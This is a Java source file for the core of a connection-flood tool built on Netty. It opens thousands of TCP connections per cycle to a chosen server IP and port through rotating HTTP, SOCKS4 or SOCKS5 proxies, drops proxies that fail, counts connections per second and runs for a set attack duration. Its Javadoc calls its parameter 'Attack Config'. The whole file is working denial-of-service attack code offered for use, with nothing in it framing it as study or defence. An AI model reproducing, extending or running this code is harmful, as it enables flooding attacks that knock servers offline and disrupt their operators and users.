package dev.lastknell.core;

import dev.lastknell.core.methods.IMethod;
import dev.lastknell.core.proxy.Proxy;
import dev.lastknell.core.proxy.ProxyManager;
import dev.lastknell.core.proxy.util.ProxyType;
import io.netty.bootstrap.Bootstrap;
import io.netty.channel.*;
import io.netty.channel.epoll.EpollEventLoopGroup;
import io.netty.channel.epoll.EpollSocketChannel;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.proxy.HttpProxyHandler;
import io.netty.handler.proxy.Socks4ProxyHandler;
import io.netty.handler.proxy.Socks5ProxyHandler;
import io.netty.util.ResourceLeakDetector;
import org.jetbrains.annotations.NotNull;

import java.net.InetSocketAddress;
import java.util.concurrent.ThreadFactory;

public class NettyBootstrap {
    // Netty related
    public static Class<? extends Channel> socketChannel;
    public final int protocolID;
    public final String srvIp;
    public final int port;
    private final ChannelHandler TAIL = new ChannelHandler() {
        @Override
        public void handlerAdded(ChannelHandlerContext ctx) {

        }

        @Override
        public void handlerRemoved(ChannelHandlerContext ctx) {

        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    };
    private final EventLoopGroup eventLoopGroup;
    // BOOTSTRAP
    private final Bootstrap BOOTSTRAP;
    public Builder builder;
    //CPS AND STUFF
    public volatile int triedCPS = 0;
    // ChannelInitializer with HTTP proxy
    private final ChannelInitializer<Channel> HTTP = new ChannelInitializer<>() {
        @Override
        public void channelInactive(@NotNull ChannelHandlerContext ctx) {
            ctx.channel().close();
        }

        @Override
        protected void initChannel(final @NotNull Channel c) {
            try {
                final Proxy proxy = builder.proxyManager.getProxy();
                final HttpProxyHandler s = (proxy.requiresAuthentication()) ? new HttpProxyHandler(proxy.getAddress(), proxy.getEmail(), proxy.getPassword()) : new HttpProxyHandler(proxy.getAddress());
                s.setConnectTimeoutMillis(builder.timeout);
                s.connectFuture().addListener(f -> {
                    if (f.isSuccess() && s.isConnected()) {
                        triedCPS++;
                        builder.method.accept(c, proxy);
                    } else {
                        if (builder.removeFailedProxy) {
                            builder.proxyManager.removeProxy(proxy);
                        }
                        c.close();
                    }
                });
                c.pipeline().addFirst(s).addLast(TAIL);
            } catch (Exception e) {
                c.close();
            }
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    };
    // ChannelInitializer with SOCKS4 proxy
    private final ChannelInitializer<Channel> SOCKS4 = new ChannelInitializer<>() {
        @Override
        public void channelInactive(@NotNull ChannelHandlerContext ctx) {
            ctx.channel().close();
        }

        @Override
        protected void initChannel(final @NotNull Channel c) {
            try {
                final Proxy proxy = builder.proxyManager.getProxy();
                final Socks4ProxyHandler s;
                if (proxy.requiresAuthentication()) {
                    s = new Socks4ProxyHandler(proxy.getAddress(), proxy.getEmail());
                } else {
                    s = new Socks4ProxyHandler(proxy.getAddress());
                }
                s.setConnectTimeoutMillis(builder.timeout);
                s.connectFuture().addListener(f -> {
                    if (f.isSuccess() && s.isConnected()) {
                        triedCPS++;
                        builder.method.accept(c, proxy);
                    } else {
                        if (builder.removeFailedProxy) {
                            builder.proxyManager.removeProxy(proxy);
                        }
                        c.close();
                    }
                });
                c.pipeline().addFirst(s).addLast(TAIL);
            } catch (Exception e) {
                c.close();
            }
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    };
    // ChannelInitializer with SOCKS5 proxy
    private final ChannelInitializer<Channel> SOCKS5 = new ChannelInitializer<>() {
        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            ctx.channel().close();
        }

        @Override
        protected void initChannel(final @NotNull Channel c) {
            try {
                final Proxy proxy = builder.proxyManager.getProxy();
                final Socks5ProxyHandler s = (proxy.requiresAuthentication()) ? new Socks5ProxyHandler(proxy.getAddress(), proxy.getEmail(), proxy.getPassword()) : new Socks5ProxyHandler(proxy.getAddress());
                s.setConnectTimeoutMillis(builder.timeout);
                s.connectFuture().addListener(f -> {
                    if (f.isSuccess() && s.isConnected()) {
                        triedCPS++;
                        builder.method.accept(c, proxy);
                    } else {
                        if (builder.removeFailedProxy) {
                            builder.proxyManager.removeProxy(proxy);
                        }
                        c.close();
                    }
                });
                c.pipeline().addFirst(s).addLast(TAIL);
            } catch (Exception e) {
                c.close();
            }
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    };
    public volatile int openedCPS = 0;
    public volatile int successfulCPS = 0;
    public volatile int totalConnections = 0;
    public volatile int averageCPS = 0;
    public boolean shouldStop = false;

    /**
     * @param builder Attack Config
     */
    public NettyBootstrap(Builder builder) {
        this.srvIp = builder.srvIp;
        this.port = builder.port;
        this.protocolID = builder.protocolID;
        this.builder = builder;
        socketChannel = builder.usingEpoll ? EpollSocketChannel.class : NioSocketChannel.class;
        this.builder.method.init(this);

        ThreadFactory threadFactory = r -> {
            Thread t = new Thread(r);
            t.setDaemon(true);
            t.setPriority(builder.usingEpoll ? 5 : 10);
            return t;
        };

        eventLoopGroup = builder.usingEpoll ? new EpollEventLoopGroup(builder.workerThreads, threadFactory) : new NioEventLoopGroup(builder.workerThreads, threadFactory);
        BOOTSTRAP = new Bootstrap().channel(socketChannel).group(eventLoopGroup).option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE);

        switch (builder.proxyType) {
            case SOCKS4 -> BOOTSTRAP.handler(SOCKS4);
            case SOCKS5 -> BOOTSTRAP.handler(SOCKS5);
            case HTTP -> BOOTSTRAP.handler(HTTP);
            default -> throw new IllegalStateException("Unexpected value: " + builder.proxyType);
        }
    }

    public void start() {
        ResourceLeakDetector.setLevel(ResourceLeakDetector.Level.SIMPLE);

        new Thread(() -> {
            int elapsed = 0;
            while (!shouldStop) {
                elapsed++;
                if (elapsed > builder.duration) {
                    shouldStop = true;
                    NettyBootstrap.this.stop();
                }
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException ignored) {
                }
                totalConnections += openedCPS;
                openedCPS = 0;
                successfulCPS = 0;
                triedCPS = 0;
                averageCPS = totalConnections / elapsed;
            }
        }).start();

        for (int i = 0; i < builder.connectLoopThreads; i++) {
            new Thread(() -> {
                final InetSocketAddress addr = new InetSocketAddress(builder.srvIp, builder.port);
                while (!shouldStop) {
                    for (int j = 0; j < builder.perDelay; j++) {
                        BOOTSTRAP.connect(addr);
                    }
                    try {
                        Thread.sleep(builder.delay);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }
                }
            }).start();
        }
    }

    public void stop() {
        shouldStop = true;
        eventLoopGroup.shutdownGracefully();
    }

    public static class Builder {
        // Required parameters
        private final IMethod method;
        private final String srvIp;
        private final int port;
        private final int protocolID;
        private final int duration;
        private final int timeout = 5000;
        private final ProxyType proxyType;
        private int perDelay = 1000;
        private int delay = 0;
        private int connectLoopThreads = 1;
        private int workerThreads = 3;
        private boolean usingEpoll = false;
        private final ProxyManager proxyManager;

        private boolean removeFailedProxy = true;

        public Builder(IMethod method, String srvIp, int port, int protocolID, int duration, ProxyType proxyType, ProxyManager proxyManager) {
            this.method = method;
            this.srvIp = srvIp;
            this.port = port;
            this.proxyManager = proxyManager;
            this.proxyType = proxyType;
            this.protocolID = protocolID;
            this.duration = duration;
        }

        public Builder perDelay(int perDelay) {
            this.perDelay = perDelay;
            return this;
        }

        public Builder connectLoopThreads(int connectLoopThreads) {
            this.connectLoopThreads = connectLoopThreads;
            return this;
        }

        public Builder usingEpoll(boolean usingEpoll) {
            this.usingEpoll = usingEpoll;
            return this;
        }

        public Builder workerThreads(int workerThreads) {
            this.workerThreads = workerThreads;
            return this;
        }

        public Builder delay(int delay) {
            this.delay = delay;
            return this;
        }

        public Builder removeFailedProxy(boolean removeFailedProxy) {
            this.removeFailedProxy = removeFailedProxy;
            return this;
        }

        public NettyBootstrap build() {
            return new NettyBootstrap(this);
        }
    }
}
